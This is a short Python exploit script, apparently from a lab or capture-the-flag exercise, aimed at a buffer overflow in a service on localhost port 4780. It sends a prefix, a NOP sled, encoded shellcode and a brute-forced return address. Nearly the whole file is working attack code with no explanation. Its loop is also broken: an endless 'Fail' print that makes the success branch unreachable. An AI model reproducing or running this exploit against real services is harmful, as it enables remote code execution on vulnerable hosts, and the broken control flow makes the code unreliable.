#!/usr/bin/python

import socket
import struct
from struct import *

buf = b""
buf += b"\x89\xe7\xd9\xc8\xd9\x77\xf4\x58\x50\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x56\x51\x49\x4b\x38"
buf += b"\x77\x7a\x43\x30\x53\x51\x53\x42\x73\x51\x7a\x75\x52"
buf += b"\x4f\x79\x78\x61\x4e\x50\x52\x46\x4a\x6d\x4b\x30\x6a"
buf += b"\x33\x53\x69\x6c\x70\x35\x6f\x78\x4d\x4d\x50\x32\x69"
buf += b"\x52\x59\x38\x79\x50\x68\x59\x50\x69\x38\x77\x48\x33"
buf += b"\x33\x30\x68\x66\x62\x75\x50\x34\x51\x43\x6c\x6c\x49"
buf += b"\x68\x61\x6e\x50\x32\x46\x62\x70\x70\x51\x42\x73\x4f"
buf += b"\x43\x67\x73\x4f\x79\x68\x61\x78\x4d\x4b\x30\x31\x42"
buf += b"\x55\x38\x52\x4e\x54\x6f\x64\x33\x53\x58\x62\x48\x56"
buf += b"\x4f\x36\x4f\x42\x42\x71\x79\x4c\x49\x38\x63\x63\x62"
buf += b"\x53\x63\x6b\x39\x48\x61\x38\x30\x36\x6b\x7a\x6d\x6f"
buf += b"\x70\x36\x51\x49\x4b\x30\x6a\x73\x31\x73\x68\x58\x4d"
buf += b"\x6f\x70\x41\x41"

husky = '021'
nopsled = '\x90' * 309
# eip = '\x70\xda\xff\xff'
padding = 'X' * 20

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 4780))

for x in range(4278190080, 4278190089):
    eip = struct.pack('<L', x)
    s.send(husky + nopsled + buf + eip + padding)
    while 1:
        print("Fail")
    else:
        print("Success")